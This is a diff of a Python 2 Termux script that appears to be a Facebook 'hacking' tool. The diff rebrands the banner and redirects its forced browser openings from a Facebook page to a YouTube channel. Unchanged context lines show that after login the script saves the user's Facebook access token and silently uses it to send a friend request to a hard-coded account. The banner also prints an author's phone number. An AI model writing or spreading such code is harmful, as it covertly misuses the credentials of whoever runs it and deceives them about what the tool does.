@@ -55,7 +55,7 @@ logo = """
 \033[1;97mAuthor\033[1;97m: \033[1;92mMR DJ
 \033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/AnonymousTrickers1
 \033[1;97mWhatsapp\033[1;97m: \033[1;92m+923045745077
-\033[1;97m«--------------------\033[1;92mTERMUX  BOYS\033[1;97m--------------------»"""
+\033[1;97Youtube\033[1;92mTERMUX  BOYS\033[1;97m Anonymous Trickers"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -98,10 +98,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.Facebook.com/Omi6t')
+            os.system('xdg-open https://www.youtube.com/channel/UC4x29jHh48BmYF9h6BD3loA')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.Facebook.com/Omi6t')
+        os.system('xdg-open https://www.youtube.com/channel/UC4x29jHh48BmYF9h6BD3loA')
 
 def login():
 	os.system('clear')
@@ -145,7 +145,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful...'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.youtube.com/channel/UC4x29jHh48BmYF9h6BD3loA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
